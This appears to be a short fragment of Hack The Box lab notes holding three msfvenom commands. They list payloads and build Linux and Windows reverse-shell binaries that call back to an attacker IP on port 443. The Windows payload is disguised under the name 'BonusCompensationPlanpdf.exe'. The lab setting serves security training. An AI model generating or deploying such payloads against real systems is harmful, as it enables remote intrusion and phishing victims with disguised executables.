...
```shell-session
xF1NN@htb[/htb]$ msfvenom -l payloads
...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
